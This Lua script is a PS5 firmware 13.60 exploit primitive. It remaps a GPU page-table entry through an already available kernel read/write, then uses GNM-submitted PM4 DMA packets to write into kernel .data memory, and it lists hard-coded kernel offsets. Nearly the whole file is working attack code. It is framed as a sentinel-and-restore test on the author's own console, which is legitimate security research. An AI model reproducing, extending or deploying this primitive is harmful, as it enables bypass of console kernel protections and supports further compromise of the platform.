--[[
  gpu1360.lua — flatz GPU-DMA kernel .data WRITE primitive, adapted to PS5 13.60
  and the Luac0re / mast1c0re PS2-emulator Lua 5.3 context.

  Lineage (all fetched + read; see FLATZ_GPU1360_LUA.md):
    * flatz gpu.lua  (itsPLK/ps5-lua-autoloader, shahrilnet/remote_lua_loader mirror;
      credited "flatz and shadPS4") — canonical Lua reference: onion alloc + PM4
      PACKET3_DMA_DATA + sceGnmSubmitCommandBuffers / sceGnmSubmitDone.
    * cragson/ps5-hen gpu_dma.cpp/.h — C++ port (onion alloc + PM4 + /dev/gc submit).
    * flatz GpuMemoryUtil.java — BD-J variant (2 MiB victim + PTE remap + DMA copy).
    * probe79/flatcopy.elf (Caliper-C0re) — the buildable 13.60 flatz port; this
      script mirrors its exact sequence, offsets and packet encoding.

  WHAT THIS DOES (13.60, own console, nothing published):
    (a) resolve sceKernelAllocateMainDirectMemory + sceKernelMapDirectMemory from
        libkernel, and sceGnmSubmitCommandBuffers + sceGnmSubmitDone from
        libSceGnmDriverForNeoMode.sprx, via Luac0re dlsym()/sceKernelLoadStartModule();
    (b) allocate ONE 2 MiB MAIN (onion, mem_type=1) direct-memory buffer, map it,
        then walk the PROCESS vmid (2) GPU page tree (13.60 5-level, 8 KB leaves,
        garlic GPU VA base 0xc80000000) and recover the victim leaf physical from the
        leaf PTE (bits 13-47, NOT from `off` or cpu_va_to_pa);
    (c) retarget the victim leaf to a kernel .data physical, DMA-write a sentinel
        through it (PACKET3_DMA_DATA opcode 0x50, GNM submit), read the field back
        through kernel R/W (kernel-copyout equivalent), then restore the leaf and
        zero the field.

  RUN IN: the Luac0re PS2-emulator process, WITH kernel R/W already available from
  the JB chain (Relapse/etaHEN on 13.60).  Luac0re alone gives only USERLAND r/w +
  dlsym — see FLATZ_GPU1360_LUA.md for the exact API split and the one wiring seam.
--]]

-- ============================================================================
-- 13.60 offsets (measured, see Caliper-C0re/kernel/GPU_DMA_PHYS_FIX.md,
-- GPU_DMA_KDATA_WRITE.md, FLATZ_GNM_COPY.md, GPUVM_OFFSETS_1360_v2.md)
-- ============================================================================
local VMSPACE_VM_VMID        = 0x1FC       -- u32 vm_vmid in struct vmspace
local DATA_BASE_GVMSPACE     = 0x2EEA570   -- gvmspace[] offset from kdata base
local SIZEOF_GVMSPACE        = 0x100       -- gvmspace entry stride
local GVMSPACE_START_VA      = 0x08        -- (0x0 on 13.60 — do not use rel_va = va - start_va)
local GVMSPACE_SIZE          = 0x10
local GVMSPACE_PAGE_DIR_VA   = 0x38        -- GPU PDB2/PML4 (stored as kernel/DMAP VA)

local PROC_VMID_KNOWN        = 2           -- process vmid, measured on 13.60

-- kernel .data target: a verified-zeroed 8-byte field (GPU_DMA_KDATA_WRITE.md)
local KDATA_TARGET_OFF       = 0x299AD0
-- kernel_pmap_store anchor for the kernel CR3 walk (13.60 validated)
local OFFSET_KERNEL_PMAP_STORE = 0x28c84a8

-- onion (MAIN) fixed garlic GPU VA base on 13.60; 8 KB leaves, +2 MiB per allocation
local ONION_GPU_VA_BASE      = 0xc80000000
local LEAF0_GVA              = ONION_GPU_VA_BASE + 0x00000  -- retargeted victim leaf
local LEAF1_GVA              = ONION_GPU_VA_BASE + 0x02000  -- sentinel source
local LEAF2_GVA              = ONION_GPU_VA_BASE + 0x04000  -- DMA_DATA packet
local LEAF3_GVA              = ONION_GPU_VA_BASE + 0x06000  -- T2 sanity target

-- ============================================================================
-- Protection / mapping flags (flatz gpu.lua + cragson gpu_dma.h)
-- ============================================================================
local PROT_CPU_READ  = 0x01
local PROT_CPU_WRITE = 0x02
local PROT_GPU_READ  = 0x10
local PROT_GPU_WRITE = 0x20
local DMEM_PROT_RW   = PROT_CPU_READ | PROT_CPU_WRITE | PROT_GPU_READ | PROT_GPU_WRITE
local MAP_NO_COALESCE = 0x00400000
local DMEM_TYPE_ONION = 1          -- flatz gpu.lua: mem_type = 1

-- ============================================================================
-- GPU page-table PDE/PTE bits (flatz GPU_PDE_*, cragson gpu_dma.h)
-- ============================================================================
local GPU_PDE_VALID     = 0x1
local GPU_PDE_IS_PTE    = (1 << 54)                 -- 2 MiB leaf
local GPU_PDE_TF        = (1 << 56)                 -- 8 KiB leaf sub-table
local GPU_ADDR_MASK     = 0x0000FFFFFFFFFFC0        -- table ptr (bits 6-47)
local GPU_ADDR_8K_MASK  = 0x0000FFFFFFFFE000        -- 8 KB leaf phys (bits 13-47)
local GPU_ADDR_2M_MASK  = 0x0000FFFFFFE00000        -- 2 MB leaf phys (bits 21-47)
-- PITFALL: do NOT write an 80-bit literal 0x0000FFFFFFFFFFE00000 — it truncates to
-- 64 bits and clears IS_PTE bit54 -> 2MB leaf becomes a table pointer -> panic.

-- ============================================================================
-- PM4 / DMA_DATA (flatz pm4_type3_header / pm4_dma_data, cragson gpu_dma.h)
-- ============================================================================
local PM4_TYPE3           = 3
local PM4_OPCODE_DMA_DATA = 0x50
local PM4_SHADER_COMPUTE  = 1

-- ============================================================================
-- CPU (x86) page-table bits for the kernel CR3 walk
-- ============================================================================
local CPU_PG_V     = 0x001
local CPU_PG_PS    = 0x080
local CPU_PG_FRAME = 0x000FFFFFFFFFF000
local RAM_MAX      = 0x400000000  -- 16 GiB

local SENTINEL     = 0xDEADBEEFCAFEBABE

-- ============================================================================
-- KERNEL R/W SEAM  — the ONLY thing that must be wired to your JB chain.
-- ----------------------------------------------------------------------------
-- Luac0re provides USERLAND read64/write64 (ROP gadgets) + dlsym + func_wrap +
-- syscall wrappers.  It does NOT provide kernel (ring-0) read/write.  The flatz
-- primitive needs kernel R/W to walk the GPU page tree (kernel DMAP VAs) and to
-- retarget the victim leaf PTE.  On a jailbroken 13.60, wire the Relapse/etaHEN
-- kernel-R/W primitive here.  Three common wirings (FLATZ_GPU1360_LUA.md §5):
--   (1) func_wrap() a kernel_copyout/kernel_copyin stub the kexp exposes;
--   (2) talk to the JB daemon's kread/kwrite over its socket;
--   (3) the elfldr route — probe79/flatcopy.elf is the same primitive in C.
-- `kernel.dmap` and `kernel.kdata_base` are per-boot and come from the JB chain.
-- ============================================================================
kernel = {}

kernel.dmap       = 0xffffff8000000000   -- KERNEL_ADDRESS_DMAP_BASE (per-boot)
kernel.kdata_base = 0x0                  -- runtime .data base (kdata_base_addr)
kernel.kernel_cr3 = 0x0                  -- kernel PML4 PA (derived below if left 0)

-- kernel.kread64(addr): read 8 bytes from a KERNEL VA (copyout-style).
kernel.kread64 = function(addr)
    -- WIRING EXAMPLE (option 1): a native stub compiled for the JB chain:
    --   local stub = func_wrap(SCE_KERNEL_COPYOUT)   -- int copyout(const void*, void*, size_t)
    --   local out = malloc(8)
    --   if stub(addr, out, 8) ~= 0 then error("kernel copyout failed") end
    --   return read64(out)
    error("kernel.kread64 not wired — connect the JB kernel-R/W primitive")
end

-- kernel.kwrite64(addr, value): write 8 bytes to a KERNEL VA (copyin-style).
kernel.kwrite64 = function(addr, value)
    -- WIRING EXAMPLE: int copyin(const void*, void*, size_t)
    --   local in = malloc(8); write64(in, value)
    --   if stub(addr, in, 8) ~= 0 then error("kernel copyin failed") end
    error("kernel.kwrite64 not wired — connect the JB kernel-R/W primitive")
end

kernel.kread32 = function(addr) return kernel.kread64(addr) & 0xFFFFFFFF end

-- read physical via the DMAP alias (kernel_copyout(dmap + pa) equivalent)
kernel.read_phys = function(pa)
    return kernel.kread64(kernel.dmap + pa)
end

-- derive the kernel CR3 from kernel_pmap_store (13.60 validated anchor)
local function derive_kernel_cr3()
    local kp = kernel.kdata_base + OFFSET_KERNEL_PMAP_STORE
    local cr3 = kernel.kread64(kp + 0x28) & ~0xFFF      -- raw PML4 PA, mask low bits
    local pml4_kva = kernel.kread64(kp + 0x20)
    if cr3 == 0 or (pml4_kva - kernel.dmap) ~= cr3 then
        error("ABORT: kernel_pmap invariant failed (kdata_base/dmap wrong?)")
    end
    kernel.kernel_cr3 = cr3
end

-- ============================================================================
-- x86 4-level walk (kernel CR3): VA -> PA  (mirrors probe79 cpu_va_to_pa)
-- ============================================================================
local function cpu_va_to_pa(pml4_pa, va)
    local i4 = (va >> 39) & 0x1FF
    local i3 = (va >> 30) & 0x1FF
    local i2 = (va >> 21) & 0x1FF
    local i1 = (va >> 12) & 0x1FF
    if pml4_pa >= RAM_MAX then return 0 end
    local e = kernel.read_phys(pml4_pa + i4 * 8)
    if (e & CPU_PG_V) == 0 then return 0 end
    local pdpt_pa = e & CPU_PG_FRAME
    e = kernel.read_phys(pdpt_pa + i3 * 8)
    if (e & CPU_PG_V) == 0 then return 0 end
    if (e & CPU_PG_PS) ~= 0 then return (e & 0x000FFFFFC0000000) | (va & 0x3FFFFFFF) end
    local pd_pa = e & CPU_PG_FRAME
    e = kernel.read_phys(pd_pa + i2 * 8)
    if (e & CPU_PG_V) == 0 then return 0 end
    if (e & CPU_PG_PS) ~= 0 then return (e & 0x000FFFFFFFE00000) | (va & 0x1FFFFF) end
    local pt_pa = e & CPU_PG_FRAME
    e = kernel.read_phys(pt_pa + i1 * 8)
    if (e & CPU_PG_V) == 0 then return 0 end
    return (e & CPU_PG_FRAME) | (va & 0xFFF)
end

-- ============================================================================
-- GPU page-table walk (13.60, 5 levels for 8 KB leaves)
--   PDB2/PML4 (page_dir_va, kernel VA) -> PDB1/PDPT -> PDB0/PD -> PTB(frag=4)
--   -> 8 KB leaf sub-table (TF bit56).  IS_PTE bit54 = 2 MB leaf (fallback).
-- Returns: phys, leaf_pte_pa (physical addr of the leaf PTE), raw, page_size
-- ============================================================================
local function gpu_pdb2(vmid)
    local gvm = kernel.kdata_base + DATA_BASE_GVMSPACE + vmid * SIZEOF_GVMSPACE
    return kernel.kread64(gvm + GVMSPACE_PAGE_DIR_VA)
end

local function gpu_walk_leaf(vmid, gva)
    local pdb2 = gpu_pdb2(vmid)
    if pdb2 == 0 then return nil end

    local i4 = (gva >> 39) & 0x1FF
    local i3 = (gva >> 30) & 0x1FF
    local i2 = (gva >> 21) & 0x1FF

    -- PDB2 (PML4) — page_dir_va is a kernel VA, read it directly
    local pml4e = kernel.kread64(pdb2 + i4 * 8)
    if (pml4e & GPU_PDE_VALID) == 0 then return nil end

    -- PDB1 (PDPT)
    local pdpt_pa = pml4e & GPU_ADDR_MASK
    local pdpe = kernel.read_phys(pdpt_pa + i3 * 8)
    if (pdpe & GPU_PDE_VALID) == 0 then return nil end

    -- PDB0 (PD)
    local pd_pa = pdpe & GPU_ADDR_MASK
    local pde = kernel.read_phys(pd_pa + i2 * 8)
    if (pde & GPU_PDE_VALID) == 0 then return nil end

    -- 2 MB leaf?
    if (pde & GPU_PDE_IS_PTE) ~= 0 then
        return (pde & GPU_ADDR_2M_MASK), (pd_pa + i2 * 8), pde, 0x200000
    end

    -- PTB
    local frag  = (pde >> 59) & 0x1F
    local ptb_pa = pde & GPU_ADDR_MASK
    local offset = gva & 0x1FFFFF

    if frag == 4 then
        local pte_idx = offset >> 16
        local pte = kernel.read_phys(ptb_pa + pte_idx * 8)
        if (pte & GPU_PDE_VALID) ~= 0 and (pte & GPU_PDE_TF) ~= 0 then
            -- 8 KB leaf sub-table
            local subtab_pa = pte & GPU_ADDR_MASK
            local leaf_idx = (gva & 0xFFFF) >> 13
            local leaf = kernel.read_phys(subtab_pa + leaf_idx * 8)
            return (leaf & GPU_ADDR_8K_MASK), (subtab_pa + leaf_idx * 8), leaf, 0x2000
        end
        return (pte & GPU_ADDR_MASK), (ptb_pa + pte_idx * 8), pte, 0x10000  -- 64 KB
    elseif frag == 1 then
        local pte_idx = offset >> 13
        local pte = kernel.read_phys(ptb_pa + pte_idx * 8)
        return (pte & GPU_ADDR_MASK), (ptb_pa + pte_idx * 8), pte, 0x2000  -- 8 KB
    else
        local pte_idx = offset >> 16
        local pte = kernel.read_phys(ptb_pa + pte_idx * 8)
        return (pte & GPU_ADDR_MASK), (ptb_pa + pte_idx * 8), pte, 0x10000  -- 64 KB
    end
end

local function phys_mask_for(page_size)
    if page_size == 0x200000 then return GPU_ADDR_2M_MASK, 0x1FFFFF end
    if page_size == 0x2000   then return GPU_ADDR_8K_MASK, 0x1FFF   end
    return 0x0000FFFFFFFF0000, 0xFFFF  -- 64 KB
end

-- ============================================================================
-- PM4 packet + GNM submit (flatz submit_dma_data_command)
-- ============================================================================
local function pm4_type3_header(opcode, count)
    return ((PM4_TYPE3 & 0x3) << 30)
         | (((count - 1) & 0x3FFF) << 16)
         | ((opcode & 0xFF) << 8)
         | ((PM4_SHADER_COMPUTE & 0x1) << 1)
end

local function build_dma_data(buf, src_va, dst_va, len_bytes)
    -- dma_data_header: cp_sync(1<<31) | dst_cache=2(<<25) | dst_vol(1<<27)
    --                  | src_cache=2(<<13) | src_vol(1<<15)  == 0x8C00C000
    -- (FLATZ_GNM_COPY.md prints 0xA3006000 — that is a doc transcription error;
    --  flatz gpu.lua, cragson gpu_dma.cpp and the on-console-verified probe76 all
    --  emit 0x8C00C000.)
    local dma_hdr = (1 << 31) | (2 << 25) | (1 << 27) | (2 << 13) | (1 << 15)
    write32(buf + 0x00, pm4_type3_header(PM4_OPCODE_DMA_DATA, 6))
    write32(buf + 0x04, dma_hdr)
    write32(buf + 0x08, src_va & 0xFFFFFFFF)
    write32(buf + 0x0C, (src_va >> 32) & 0xFFFFFFFF)
    write32(buf + 0x10, dst_va & 0xFFFFFFFF)
    write32(buf + 0x14, (dst_va >> 32) & 0xFFFFFFFF)
    write32(buf + 0x18, len_bytes & 0x1FFFFF)
    return 28  -- 7 dwords
end

local function gnm_submit_copy(cmd_gva, cmd_bytes)
    local dcb = malloc(8)
    local dsz = malloc(4)
    write64(dcb, cmd_gva)
    write32(dsz, cmd_bytes)
    local r = sceGnmSubmitCommandBuffers(1, dcb, dsz, 0, 0)
    if (r & 0xFFFFFFFF) ~= 0 then
        errorf("sceGnmSubmitCommandBuffers() error: %s", to_hex(r & 0xFFFFFFFF))
    end
    local rd = sceGnmSubmitDone()
    if (rd & 0xFFFFFFFF) ~= 0 then
        errorf("sceGnmSubmitDone() error: %s", to_hex(rd & 0xFFFFFFFF))
    end
    return rd
end

-- ============================================================================
-- Onion (MAIN) direct-memory allocation (flatz alloc_main_dmem, mem_type=1)
-- ============================================================================
local function alloc_main_dmem(size, prot, flag)
    local out = malloc(0x8)
    local ret = sceKernelAllocateMainDirectMemory(size, size, DMEM_TYPE_ONION, out)
    if (ret & 0xFFFFFFFF) ~= 0 then
        errorf("sceKernelAllocateMainDirectMemory() error: %s", to_hex(ret & 0xFFFFFFFF))
    end
    local phys_addr = read64(out)
    write64(out, 0)
    ret = sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size)
    if (ret & 0xFFFFFFFF) ~= 0 then
        errorf("sceKernelMapDirectMemory() error: %s", to_hex(ret & 0xFFFFFFFF))
    end
    return read64(out), phys_addr
end

-- ============================================================================
-- Main sequence
-- ============================================================================
function gpu1360()
    send_notification("gpu1360: flatz GPU-DMA kdata write (13.60)")

    -- (a) resolve symbols ----------------------------------------------------
    if not sceKernelDlsym then init_dlsym() end

    sceKernelAllocateMainDirectMemory = func_wrap(dlsym(LIBKERNEL_HANDLE, "sceKernelAllocateMainDirectMemory"))
    sceKernelMapDirectMemory          = func_wrap(dlsym(LIBKERNEL_HANDLE, "sceKernelMapDirectMemory"))

    -- GNM: flatz uses find_mod_by_name("libSceGnmDriverForNeoMode.sprx"); Luac0re
    -- has no find_mod_by_name, so load/get the module handle via LoadStartModule
    -- (returns the existing handle if already loaded in this graphics process).
    local sceKernelLoadStartModule = func_wrap(dlsym(LIBKERNEL_HANDLE, "sceKernelLoadStartModule"))
    local gnm = sceKernelLoadStartModule("libSceGnmDriverForNeoMode.sprx", 0, 0, 0, 0, 0)
    if (gnm & 0xFFFFFFFF) >= 0x80000000 then
        errorf("failed to load libSceGnmDriverForNeoMode.sprx: %s", to_hex(gnm & 0xFFFFFFFF))
    end
    sceGnmSubmitCommandBuffers = func_wrap(dlsym(gnm, "sceGnmSubmitCommandBuffers"))
    sceGnmSubmitDone           = func_wrap(dlsym(gnm, "sceGnmSubmitDone"))

    -- kernel R/W seam sanity + per-boot values --------------------------------
    if kernel.kdata_base == 0 then
        error("kernel.kdata_base not set — wire the JB chain (FLATZ_GPU1360_LUA.md §5)")
    end
    if kernel.kernel_cr3 == 0 then derive_kernel_cr3() end

    -- translate the target kernel VA -> PA (validated kernel CR3 walk) --------
    local target_kva = kernel.kdata_base + KDATA_TARGET_OFF
    local target_pa  = cpu_va_to_pa(kernel.kernel_cr3, target_kva)
    if target_pa == 0 then error("ABORT: kernel CR3 walk failed for target") end
    send_notification("gpu1360: target_pa=" .. to_hex(target_pa))

    -- safety gate: target must be zero + stable -------------------------------
    if kernel.kread64(target_kva) ~= 0 then
        error("ABORT: kernel .data target not zero (wrong/unsafe field?)")
    end

    -- (b) flatz onion/MAIN allocation (mem_type=1), single 2 MiB buffer -------
    local SZ = 2 * 1024 * 1024
    local victim_va, off = alloc_main_dmem(SZ, DMEM_PROT_RW, MAP_NO_COALESCE)
    send_notification("gpu1360: victim_va=" .. to_hex(victim_va) .. " off=" .. to_hex(off))

    -- process vmid (2) + gvmspace base; walk the 13.60 tree ------------------
    local vmid = PROC_VMID_KNOWN
    local phys0, pte0, raw0, sz0 = gpu_walk_leaf(vmid, LEAF0_GVA)
    local phys1, pte1, raw1, _    = gpu_walk_leaf(vmid, LEAF1_GVA)
    local phys2, pte2, raw2, _    = gpu_walk_leaf(vmid, LEAF2_GVA)
    local phys3, pte3, raw3, _    = gpu_walk_leaf(vmid, LEAF3_GVA)
    send_notification(string.format("gpu1360: leaves phys0=%s phys1=%s phys2=%s phys3=%s",
        to_hex(phys0 or 0), to_hex(phys1 or 0), to_hex(phys2 or 0), to_hex(phys3 or 0)))
    if not (phys0 and phys1 and phys2 and phys3) then
        error("ABORT: victim leaves not all mapped (lazy population — see GPUVM_POPULATION.md)")
    end

    local phys_mask, off_mask = phys_mask_for(sz0)

    -- T2 sanity: retarget leaf0 -> leaf3 phys, DMA leaf1(sentinel) -> leaf0 -----
    local t2_new = (raw0 & ~phys_mask) | (phys3 & phys_mask)
    kernel.kwrite64(kernel.dmap + pte0, t2_new)
    write64(victim_va + 0x6000, 0)
    write64(victim_va + 0x2000, SENTINEL)
    build_dma_data(victim_va + 0x4000, LEAF1_GVA, LEAF0_GVA, 8)
    gnm_submit_copy(LEAF2_GVA, 28)
    microsleep(500 * 1000)
    local got = read64(victim_va + 0x6000)
    send_notification(string.format("gpu1360: T2 got=%s expect=%s %s",
        to_hex(got), to_hex(SENTINEL), got == SENTINEL and "PASS" or "FAIL"))
    kernel.kwrite64(kernel.dmap + pte0, raw0)  -- restore leaf0

    -- (c) T3 write: retarget leaf0 -> kernel .data base, DMA leaf1 -> leaf0+off --
    local target_base = target_pa & ~off_mask
    local off_in      = target_pa & off_mask
    local t3_new = (raw0 & ~phys_mask) | (target_base & phys_mask)
    kernel.kwrite64(kernel.dmap + pte0, t3_new)

    write64(victim_va + 0x2000, SENTINEL)
    build_dma_data(victim_va + 0x4000, LEAF1_GVA, LEAF0_GVA + off_in, 8)
    gnm_submit_copy(LEAF2_GVA, 28)
    microsleep(500 * 1000)

    local after = kernel.kread64(target_kva)           -- kernel-copyout read-back
    send_notification(string.format("gpu1360: T3 after=%s expect=%s %s",
        to_hex(after), to_hex(SENTINEL), after == SENTINEL and "PASS" or "FAIL"))

    -- restore: DMA zeros back, then restore the leaf ---------------------------
    write64(victim_va + 0x2000, 0)
    build_dma_data(victim_va + 0x4000, LEAF1_GVA, LEAF0_GVA + off_in, 8)
    gnm_submit_copy(LEAF2_GVA, 28)
    microsleep(500 * 1000)
    kernel.kwrite64(kernel.dmap + pte0, raw0)

    send_notification(after == SENTINEL and "RESULT: KDATA_WRITE_PASS"
                                          or "RESULT: KDATA_WRITE_FAIL")
    return after == SENTINEL
end

-- Uncomment to run on load (payloads/*.lua style):
-- gpu1360()
